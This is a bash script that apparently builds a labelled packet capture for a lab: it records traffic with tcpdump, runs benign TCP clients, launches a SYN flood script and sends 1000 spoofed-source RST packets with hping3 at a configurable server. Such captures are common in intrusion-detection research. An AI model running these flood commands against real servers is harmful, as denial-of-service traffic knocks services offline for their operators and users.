#!/bin/bash
# start_attack.sh

# Variables
SERVER_IP="127.0.1.7"      # Replace with server IP
SERVER_PORT=8080          # Replace with server port
ATTACK_DURATION=100       # Attack duration in seconds
LEGIT_TRAFFIC_DURATION=140  # Total duration for legitimate traffic

# Function to safely kill processes
safe_kill() {
    if ps -p $1 > /dev/null 2>&1; then
        sudo kill $1
    fi
}

# Start tcpdump to capture packets
echo "Starting packet capture..."
sudo tcpdump -i eth0 -w capture.pcap &
TCPDUMP_PID=$!
sleep 2  # Give tcpdump time to initialize

# Check if tcpdump started successfully
if ! ps -p $TCPDUMP_PID > /dev/null 2>&1; then
    echo "Error: Failed to start tcpdump."
    exit 1
fi

# Start legitimate traffic (First 20 sec)
echo "Starting legitimate traffic..."
python3 - <<END &
import socket
import time

def legitimate_traffic(server_ip, server_port):
    while True:
        try:
            # Establish connection (3-way handshake)
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((server_ip, server_port))
            print(f"Connected to {server_ip}:{server_port}")

            # Send data
            client_socket.send(b"Hello from client!")

            # Receive data
            data = client_socket.recv(1024)
            print(f"Received: {data.decode()}")

            # Close connection (FIN-ACK)
            client_socket.close()
            print("Connection closed.")
        except Exception as e:
            print(f"Error: {e}")
        time.sleep(1)

legitimate_traffic("$SERVER_IP", $SERVER_PORT)
END
LEGIT_TRAFFIC_PID=$!

# Wait 20 seconds before starting the attack
sleep 20

# Start SYN flood attack
echo "Starting SYN flood attack..."
sudo python3 syn_flood.py $SERVER_IP $SERVER_PORT $ATTACK_DURATION &
SYN_FLOOD_PID=$!

# Let the attack run for 100 seconds
sleep $ATTACK_DURATION

# Stop the SYN flood attack
echo "Stopping SYN flood attack..."
safe_kill $SYN_FLOOD_PID

echo "Sending RST packets to terminate connections..."
sudo hping3 -R -c 1000 -p $SERVER_PORT $SERVER_IP --rand-source & 
RST_ATTACK_PID=$!

# Keep legitimate traffic running for 20 more seconds
echo "Continuing legitimate traffic for another 20 seconds..."
sleep 20

# Stop legitimate traffic
echo "Stopping legitimate traffic..."
safe_kill $LEGIT_TRAFFIC_PID

# Stop tcpdump
echo "Stopping packet capture..."
safe_kill $TCPDUMP_PID

echo "Attack and packet capture complete. PCAP file saved as capture.pcap."
